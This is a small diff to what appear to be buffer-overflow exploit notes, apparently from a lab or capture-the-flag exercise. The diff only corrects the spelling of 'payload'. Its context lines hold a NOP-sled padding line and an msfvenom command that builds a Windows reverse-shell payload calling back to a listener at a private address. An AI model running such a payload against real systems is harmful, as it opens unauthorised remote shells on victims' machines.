@@ -67,6 +67,6 @@ padding = "\x90" * 16
 
 
 
-Shell payalod :
+Shell payload :
 
 msfvenom -p windows/shell_reverse_tcp LHOST=10.6.75.240 LPORT=443 EXITFUNC=thread -f c -a x86 -b "\x00"
